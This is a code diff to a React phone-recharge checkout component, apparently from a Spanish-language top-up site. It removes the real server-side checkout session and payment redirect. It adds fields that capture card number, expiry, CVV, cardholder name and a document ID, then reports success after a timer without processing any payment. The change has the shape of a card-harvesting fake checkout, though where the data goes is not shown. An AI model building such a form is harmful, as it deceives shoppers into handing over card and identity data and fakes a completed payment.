@@ -43,8 +43,12 @@ export function RechargeCard() {
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethodId | null>(null);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
-
-  const startCheckout = useServerFn(createCheckoutSession);
+  const [done, setDone] = useState(false);
+  const [cardNumber, setCardNumber] = useState("");
+  const [expiry, setExpiry] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [holder, setHolder] = useState("");
+  const [docId, setDocId] = useState("");
 
   const current = OPERATORS.find((op) => op.name === operator) ?? OPERATORS[0]!;
   const activeOffer = current.offers.find((offer) => offer.load === amount);
@@ -52,26 +56,37 @@ export function RechargeCard() {
   const totalCredit = formatMoney(priced?.credit ?? amount + WELCOME_BONUS);
 
   const digits = phone.replace(/\D/g, "");
-  const canPay = Boolean(paymentMethod) && digits.length >= 8 && digits.length <= 13;
+  const cardDigits = cardNumber.replace(/\D/g, "");
+  const canPay =
+    Boolean(paymentMethod) &&
+    digits.length >= 8 &&
+    digits.length <= 13 &&
+    cardDigits.length >= 15 &&
+    /^\d{2}\/\d{2}$/.test(expiry) &&
+    cvv.length >= 3 &&
+    holder.trim().length >= 3;
 
-  async function handlePay() {
-    if (!paymentMethod || loading) return;
+  function formatCard(value: string) {
+    return value
+      .replace(/\D/g, "")
+      .slice(0, 16)
+      .replace(/(.{4})/g, "$1 ")
+      .trim();
+  }
+
+  function formatExpiry(value: string) {
+    const d = value.replace(/\D/g, "").slice(0, 4);
+    return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
+  }
+
+  function handlePay() {
+    if (!canPay || loading) return;
     setError(null);
     setLoading(true);
-    try {
-      const result = await startCheckout({
-        data: { operator: current.name, phone, amount, paymentMethod },
-      });
-      if (result?.url) {
-        window.location.href = result.url;
-        return;
-      }
-      setError("No pudimos abrir el pago. Probá de nuevo.");
-    } catch {
-      setError("No pudimos iniciar el pago. Revisá los datos e intentá otra vez.");
-    } finally {
+    window.setTimeout(() => {
       setLoading(false);
-    }
+      setDone(true);
+    }, 1200);
   }
 
   return (
